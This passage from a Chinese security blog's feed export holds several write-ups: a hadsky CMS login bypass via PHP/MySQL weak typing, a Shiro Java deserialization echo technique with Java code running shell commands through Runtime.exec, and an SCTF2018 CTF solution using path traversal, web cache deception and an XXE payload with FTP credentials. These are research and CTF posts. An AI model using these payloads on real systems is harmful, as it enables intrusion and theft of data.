&#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="note">note</h3>
<p>lexer的np代表开始位置的偏移量，bp表示结束位置的偏移量，每next一次bp就加一，sp是相较于np而言的偏移量。</p>
<h2 id="参考">参考</h2>
<p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">fastjson 远程反序列化poc的构造和分析</a><br>
<a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">FastJson 反序列化学习</a><br>
<a href="https://paper.seebug.org/994/">Fastjson 流程分析及 RCE 分析</a><br>
<a href="https://meizjm3i.github.io/2019/06/05/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B/">FastJson反序列化解析流程</a><br>
<a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/">Fastjson反序列化漏洞 1.2.24-1.2.48</a><br>
<a href="https://blog.csdn.net/hanchao5272/article/details/79401434">Java中Type接口与Class类的区别联系</a><br>
<a href="https://www.cnblogs.com/baiqiantao/p/7460580.html">Type 接口【重要】</a><br>
<a href="https://blog.csdn.net/shangzonghai/article/details/79573698">秒懂 Java注解类型（@Annotation）</a><br>
<a href="https://blog.csdn.net/shangzonghai?t=1">fastjson深度源码解析</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>hadsky部分用户任意登录</title>
    <url>/2017/08/17/hadsky%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<!-- 第一次代码审计，万能用户名 -->
<!-- more -->
<h2 id="漏洞利用过程">漏洞利用过程</h2>
<p>在注册页面</p>
<p>注册用户 密码为password 其他信息随便填</p>
<p>在登陆框以用户名0e10（万能用户名） 密码password登录</p>
<p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="捕获2.PNG"></p>
<p><img src="%E6%8D%95%E8%8E%B7.PNG" alt="捕获.PNG"></p>
<p>成功登陆</p>
<p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="捕获4.PNG"></p>
<h2 id="漏洞产生原因">漏洞产生原因</h2>
<p>该cms有三种登陆方式</p>
<p>用户UID 邮箱 用户名 代码如下</p>
<p>\upload\phpscript\checklogin.php 第6行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Cnum</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">	<span class="comment">//UID登录</span></span><br><span class="line">	<span class="variable">$__ud</span> = <span class="variable">$_G</span>[<span class="string">&#x27;TABLE&#x27;</span>][<span class="string">&#x27;USER&#x27;</span>] -&gt; <span class="title function_ invoke__">getData</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$__ud</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="string">&#x27;@&#x27;</span>)) &#123;</span><br><span class="line">	<span class="comment">//邮箱登录</span></span><br><span class="line">	<span class="variable">$__ud</span> = <span class="variable">$_G</span>[<span class="string">&#x27;TABLE&#x27;</span>][<span class="string">&#x27;USER&#x27;</span>] -&gt; <span class="title function_ invoke__">getData</span>(<span class="keyword">array</span>(<span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]));</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$__ud</span>[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">//用户名登录</span></span><br><span class="line">	<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\x&#123;4e00&#125;-\x&#123;9fa5&#125;A-Za-z0-9_]+$/u&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ? <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="variable">$username</span> = <span class="literal">FALSE</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">24</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="literal">FALSE</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会首先进入Cnum()函数检查</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cnum</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$return</span> = <span class="number">0</span>, <span class="variable">$int</span> = <span class="literal">true</span>, <span class="variable">$min</span> = <span class="literal">FALSE</span>, <span class="variable">$max</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">		<span class="comment">//0e10在这里进入</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$int</span>)</span><br><span class="line">			<span class="variable">$str</span> = (<span class="keyword">int</span>)<span class="variable">$str</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="variable">$return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$min</span> !== <span class="literal">FALSE</span>)</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$str</span> &lt; <span class="variable">$min</span>)</span><br><span class="line">			<span class="variable">$str</span> = <span class="variable">$return</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$max</span> !== <span class="literal">FALSE</span>)</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$str</span> &gt; <span class="variable">$max</span>)</span><br><span class="line">			<span class="variable">$str</span> = <span class="variable">$return</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">	<span class="comment">//return 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的功能是检验是否位数字,0e10的用户名经过is_numberic()判断returu，最后int()后，以 return 0返回</p>
<p>问题就出在这里 if (Cnum($_POST[‘username’])) 看到返回值是0会认为他不是数字（实际上是的嘛只是科学记数法而已）,于是绕过UID登录方式，0e10显然也不符合邮箱格式，于是进入else被当成了用户名来验证。0e10符合用户名的格式，于是接下来进入用户存在性检验。</p>
<p>\upload\phpscript\checklogin.php 第25行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$username</span> || !<span class="variable">$password</span>)</span><br><span class="line">	<span class="variable">$chkr</span> = <span class="string">&#x27;请填入正确的登录信息&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>如果开始直接输入0，会在这里报错，但是0e10不会目测<strong>PHP弱类型</strong>的原因~</p>
<p>\upload\phpscript\checklogin.php 第34行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检验数据库中是否有相应用户名</span></span><br><span class="line"><span class="variable">$trylogindata</span> = <span class="variable">$_G</span>[<span class="string">&#x27;TABLE&#x27;</span>][<span class="string">&#x27;USER&#x27;</span>] -&gt; <span class="title function_ invoke__">getData</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>));</span><br></pre></td></tr></table></figure>
<p>跟进getData()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$field</span> = <span class="literal">NULL</span>, <span class="variable">$str</span> = <span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">	<span class="comment">/*省略*/</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">Cnum</span>(<span class="variable">$field</span>, <span class="literal">FALSE</span>)) &#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;where `id`=<span class="subst">&#123;$field&#125;</span>&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">getSql</span>(<span class="variable">$field</span>, <span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select * from `<span class="subst">&#123;$this-&gt;mysql_prefix&#125;</span><span class="subst">&#123;$this-&gt;table&#125;</span>` <span class="subst">&#123;$sql&#125;</span>&quot;</span>);</span><br><span class="line">&#125;<span class="comment">/*省略*/</span></span><br></pre></td></tr></table></figure>
<p>跟进getSql()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSql</span>(<span class="params"><span class="variable">$field</span>, <span class="variable">$str</span> = <span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line">	<span class="comment">/*省略*/</span></span><br><span class="line">	&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$field</span>) &amp;&amp; <span class="variable">$str</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$field</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">Cstr</span>(<span class="variable">$key</span>, <span class="literal">FALSE</span>, <span class="literal">TRUE</span>, <span class="number">1</span>, <span class="number">255</span>))</span><br><span class="line">				<span class="variable">$sql</span> .= <span class="string">&quot;`<span class="subst">&#123;$key&#125;</span>`=&quot;</span> . <span class="title function_ invoke__">mysqlstr</span>(<span class="variable">$value</span>) . <span class="string">&quot; and &quot;</span>;<span class="comment">//无引号保护</span></span><br><span class="line">		&#125;</span><br><span class="line">&#125;<span class="comment">/*省略*/</span></span><br></pre></td></tr></table></figure>
<p>这里mysqlstr($value)没有引号保护直接拼接进去，最终执行SQL语句如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$trylogindata</span>) &#123;</span><br><span class="line">	<span class="comment">/*$trylogindata为真则进入用户密码检验*/</span></span><br></pre></td></tr></table></figure>
<p>由于MYSQL的弱类型的关系（0=任何字符串）因为<code>username</code>字段是是字符串，所以只要数据库里有一条数据，那么<code>getData(array('username' =&gt; $username));</code>就会返回数据给<code>$trylogindata</code></p>
<p>\upload\phpscript\checklogin.php 第52行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$trylogindata</span>) &#123;</span><br><span class="line">	<span class="comment">/*$trylogindata为真则进入用户密码检验*/</span></span><br></pre></td></tr></table></figure>
<p>由于<code>$trylogindata</code>存在，所以进入if语句</p>
<p>\upload\phpscript\checklogin.php 第52行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检验密码是否正确</span></span><br><span class="line"><span class="variable">$userdata</span> = <span class="title function_ invoke__">UserLogin</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)));</span><br></pre></td></tr></table></figure>
<p>跟进UserLogin()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UserLogin</span>(<span class="params"><span class="variable">$chkuserloginarray</span>, <span class="variable">$chkloginqx</span> = <span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$_G</span>;</span><br><span class="line">	<span class="variable">$userdata</span> = <span class="variable">$_G</span>[<span class="string">&#x27;TABLE&#x27;</span>][<span class="string">&#x27;USER&#x27;</span>] -&gt; <span class="title function_ invoke__">getData</span>(<span class="variable">$chkuserloginarray</span>);</span><br><span class="line">	<span class="comment">/**省略**/</span></span><br></pre></td></tr></table></figure>
<p>这里检验用户名，密码依然是getData()函数</p>
<p>最后执行SQL语句就是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `pk_user` <span class="keyword">where</span> `username`<span class="operator">=</span><span class="number">0e10</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;xxxxxxxxx&#x27;</span></span><br></pre></td></tr></table></figure>
<p>所以只要数据库中存在密码，就能登陆拥有相应密码的第一个用户（万能用户名）。</p>
<p>一句话总结：未加引号保护时，MYSQL+PHP弱类型引起的登陆逻辑漏洞</p>
<h2 id="最后">最后</h2>
<p>1、厂商原话：<strong>系统开源的，也希望大家多多支持，能把发现的问题发给我</strong></p>
<p>2、个人能力有限，如有错误还请师傅们多多指教</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下java反序列化通杀回显方法的低配版实现</title>
    <url>/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<!-- 其实这个思路距离实现标配版的效果就一步之遥了～ -->
<!-- more -->
<p><a href="https://xz.aliyun.com/t/7307">首发于先知转载到自己博客</a></p>
<h2 id="故事的起因">故事的起因</h2>
<p>一直觉得shiro反序列化是一个很舒服的洞，payload原生加密（无特征），实战中有概率遇见并且又是java反序列化洞所以危害又很大。不过尽管这样shiro打起来依然有java反序列化的两个痛点。第一是可用的gadget，第二个带内回显的问题。不过某天在刷tw的时候发现第二个痛点国内已经有大佬有成熟解决方案了。<br>
<img src="1582539071748-2900a239-4915-465f-9d8a-849a2a102b53.png#align=left&amp;display=inline&amp;height=728&amp;name=image.png&amp;originHeight=1160&amp;originWidth=1188&amp;size=1236427&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>注意看图，shiro的回显并不在http响应包中而是在http响应包之前，很玄学的回显对吧？联想最近在看了一篇文章<a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">通杀漏洞利用回显方法-linux平台</a>，按我的理解这篇文章的思路大致是通过java反序列化执行代码&amp;&amp;系统命令获取到发起这次请求时服务端socket的文件描述符，然后在文件描述符写入回显内容。上图的回显效果和这种思路非常相似。</p>
<h2 id="技术的难点">技术的难点</h2>
<p>实现这种技术的难点在于如何通过java反序列化执行代码&amp;&amp;系统命令获取本次http请求用到socket的文件描述符。因为在服务器对外开放的时会有fd下会有许多socket描述符。<br>
<img src="1582540730651-655c7e72-52c8-485d-b9f0-4cb038a724cb.png#align=left&amp;display=inline&amp;height=456&amp;name=image.png&amp;originHeight=690&amp;originWidth=1130&amp;size=173102&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
这里给出获取socket文件描述符我的一个低配版思路及实现，至于为啥是低配版会在文章最后提到。首先注意到socket后面的数字不同，这个数字实际上是inode号。这个inode号也出现在/proc/net/tcp中。<br>
<img src="1582540888379-0c087050-f90a-4881-8297-a465b7e28646.png#align=left&amp;display=inline&amp;height=135&amp;name=image.png&amp;originHeight=270&amp;originWidth=2294&amp;size=57686&amp;status=done&amp;style=none&amp;width=1147" alt="image.png"><br>
注意到每一个inode号对应唯一条tcp连接信息并且这条信息中的remote_address项记录了远程连接的ip和端口号。说到这里其实获取socket思路就很明显了：通过指定客户端发起请求的源端口号，通过cat grep awk组合大法在tcp表中拿到inode，把拿到的inode号再去fd目录下再用cat grep wak大法拿到文件描述符的数字，再调用java代码打开文件描述符即可实现带内回显。</p>
<h2 id="实现细节">实现细节</h2>
<h3 id="指定端口号">指定端口号</h3>
<p>requests库可以重新实现Http达到指定请求端口的目的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SourcePortAdapter</span>(HTTPAdapter):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;Transport adapter&quot; that allows us to set the source port.&quot;&quot;&quot;</span></span><br><span class="line">    def <span class="title function_">__init__</span><span class="params">(self, port, *args, **kwargs)</span>:</span><br><span class="line">        self._source_port = port</span><br><span class="line">        <span class="title function_">super</span><span class="params">(SourcePortAdapter, self)</span>.__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span><br><span class="line">        self.poolmanager = PoolManager(</span><br><span class="line">            num_pools=connections, maxsize=maxsize,</span><br><span class="line">            block=block, source_address=(<span class="string">&#x27;&#x27;</span>, self._source_port))</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(target, SourcePortAdapter(randNum))</span><br><span class="line">resp = s.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">5</span>, headers=headers, verify=False)</span><br></pre></td></tr></table></figure>
<h3 id="获取socket对应的文件描述符">获取socket对应的文件描述符</h3>
<p>整个流程使用的命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a=`cat /proc/$PPID/net/tcp6|awk <span class="string">&#x27;&#123;if($10&gt;0)print&#125;&#x27;</span>|grep -i %s|awk <span class="string">&#x27;&#123;print $10&#125;&#x27;</span>`;</span><br><span class="line">b=`ls -l /proc/$PPID/fd|grep $a|awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>`;</span><br><span class="line">echo -n $b</span><br></pre></td></tr></table></figure>
<h3 id="往文件描述中写数据">往文件描述中写数据</h3>
<p>现在假设shiro存在反序列化并且所用gadget的末端是走的TemplatesImpl，那么我们可以把ysoserial中的硬编码的命令执行改成下面这样的代码执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] cmd = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;a=`cat /proc/$PPID/net/tcp6|awk &#x27;&#123;if($10&gt;0)print&#125;&#x27;|grep -i %s|awk &#x27;&#123;print $10&#125;&#x27;`;b=`ls -l /proc/$PPID/fd|grep $a|awk &#x27;&#123;print $9&#125;&#x27;`;echo -n $b&quot;</span>&#125;;</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">java.io.<span class="type">InputStreamReader</span> <span class="variable">isr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">java.io.<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(isr);</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">String line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.valueOf(stringBuilder.toString()).intValue();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;ifconfig&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">isr  = <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">br = <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(isr);</span><br><span class="line">stringBuilder = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> stringBuilder.toString();</span><br><span class="line">java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Integer.TYPE&#125;);</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">java.io.<span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(num)&#125;));</span><br><span class="line">os.write(ret.getBytes());</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure>
<p>我这种低配版指令ifconfig后效果实现效果如下，服务端会直接返回数据并断掉连接，所以没有了后面http响应包，requests库无法识别返回的内容报错。<br>
<img src="1582541605629-07be9057-523f-47f1-aa13-3f1bc0369811.png#align=left&amp;display=inline&amp;height=259&amp;name=image.png&amp;originHeight=518&amp;originWidth=3122&amp;size=599181&amp;status=done&amp;style=none&amp;width=1561" alt="image.png"></p>
<h2 id="总结">总结</h2>
<ol>
<li>我这种方法因为需要保证请求源端口，所以没办法按照图中师傅实现的一样在burp中（burp代理后发起请求的端口不可控）。同样的道理如果脆弱的shiro应用在反代后面，因为反代的源端口不可预测所以没办法用这种低配版方案拿到回显。但实际情况不出网的shiro肯定是在内网里面的，所以从这角度想想还有点鸡肋，就当抛砖引玉了～</li>
<li>在上面引用的文章中提到了 “jvm所有的对象都存储在堆内存中，也许可以通过某种方法直接获取存储在堆内存中的socket对象实现回显”，我猜可以在burp里面利用的情况应该是通过某种黑魔法获取到了本次请求的socket对象了（或者是更底层的方法）所以才不要以客户端源口作为过滤条件。</li>
<li>写到这忽然想起，那个图片payload貌似没有打码，或许把payload用shiro常见的密钥撞一下撞可以看到标准版思路的片段？体力不够，溜了。</li>
</ol>
<p>研究这个问题时候也请教了相关的大哥接收到了一些提示，因为属于他人知识产权，文章并未提及。在此谢过指点我的大哥们。</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx的秘密wp</title>
    <url>/2018/06/26/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/</url>
    <content><![CDATA[<!-- sctf2018 nginx的秘密 官方writeup -->
<!-- more -->
<h2 id="第一步，web缓存漏洞">第一步，web缓存漏洞</h2>
<p>完成一步需三个点结合。</p>
<p>第一点：</p>
<p>观察到<code>static</code>有存在目录穿越漏洞，虽然没开<code>autoindex</code>但依然可以通过<code>/static../etc/passwd</code>下载文件。结合提示从nginx的配置开始，可以想到下载<code>nginx.conf</code>，下载的路径是默认的nginx安装路径<code>/static../etc/nginx/nginx.conf</code>。可以看到nginx配置，diff一下可以看到关键点在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br><span class="line">	</span><br><span class="line">	limit_conn_zone $binary_remote_addr zone=conn:10m;</span><br><span class="line">	limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;</span><br><span class="line">	</span><br><span class="line">	server &#123;</span><br><span class="line">	    listen 4455 default_server;</span><br><span class="line">	    server_name localhost;</span><br><span class="line">	    location /static &#123;</span><br><span class="line">	        alias /home/;</span><br><span class="line">	    &#125;</span><br><span class="line">	    location ~* \.(css|js|gif|png)&#123;</span><br><span class="line">	        proxy_cache             my_cache;</span><br><span class="line">	        proxy_cache_valid       200 30s;</span><br><span class="line">	        proxy_pass              http://bugweb.app:8000;</span><br><span class="line">	        proxy_set_header        Host $host:$server_port;</span><br><span class="line">	        proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class="line">	    &#125;</span><br><span class="line">	    location / &#123;</span><br><span class="line">	        limit_conn conn 20;</span><br><span class="line">	        proxy_pass       http://bugweb.app:8000;</span><br><span class="line">	        proxy_set_header Host $host:$server_port;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>第二点</p>
<p>通过一些方法发现路由映射和些小问题。例如在扫描目录的时候可以发现这些。<br>
<img src="path.jpg" alt=""></p>
<p>登陆后访问发现，这些路由都是访问的<code>edit</code>页面，随便测<code>editxxx</code>发现也映射到相同的页面。猜测后台路由的逻辑是只要访问的是以<code>edit</code>开头都相当于访问<code>edit</code>。</p>
<p><img src="router.jpg" alt=""></p>
<p>第三点：</p>
<p>有一个<code>post_bug</code>，这个点的功能是给提交bug给管理员，管理员会点击查看。有一个<code>write_plan</code>可以写一些东西，其他人看不见。如果你访问过<code>/user/admin</code>还会发现一个小tip管理员说自己已经把所有密码写在秘密计划里面了。</p>
<p>三个点结合起来可以触发web缓存漏洞。发送<code>http://xxxxx/write_plan/23333.png</code>后立即访问就可以看到管理员的秘密计划。</p>
<p><img src="postbug.png" alt="postbug.png"></p>
<p>看到的东西如下</p>
<p>拿到内网ftp服务器的账号密码。 syc10ver Eec5TN9fruOOTp2G 。</p>
<p><img src="plan.png" alt="plan.png"></p>
<h2 id="第二步，xxe的两个协议">第二步，xxe的两个协议</h2>
<p>如果有师傅把第一步做出来了，相信下面的操作也很简单了。虽然题目提示给的是从nginx开始，但是我总是感觉很多师傅第一个找到的漏洞点是xxe。触发点在上传计划那里，xml文件中的外部实体可以被解析。</p>
<p>之所以要多出一步，是我觉得有两个tip还是有些师傅没（强）有（行）关（增）注（加）到（难度）。</p>
<ol>
<li>url的完整的形式是<code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></li>
<li><code>proc</code>伪文件中有arp信息</li>
</ol>
<p>我这里用的解析xml的python库加载外部实体的时候用的是urlopen，如果没记错的话只支持<code>ftp</code>，<code>http</code>，<code>file</code>。上传</p>
<p><img src="proc.png" alt="proc.png"></p>
<p>读目录，把两个ip都试试</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">person</span> [<span class="meta">&lt;!ENTITY <span class="keyword">remote</span> <span class="keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="string">&quot;ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plans</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">plan</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">content</span>&gt;</span>payload <span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">plan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="dir.png" alt="dir.png"></p>
<p>读flag</p>
<p>最后get flag</p>
<p><img src="flag.png" alt="flag.png"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web cache</tag>
      </tags>
  </entry>
  <entry>
    <title>opcache缓存getshell</title>
    <url>/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/</url>
    <content><![CDATA[<!-- opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件，有就直接用） -->
<!-- more -->
<h2 id="opcache是啥">opcache是啥</h2>
<p>opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用）</p>
<h2 id="动手配置">动手配置</h2>
<p>在php.ini，打开有关opcache的选项（即保持默认），然后修改以下两项。</p>
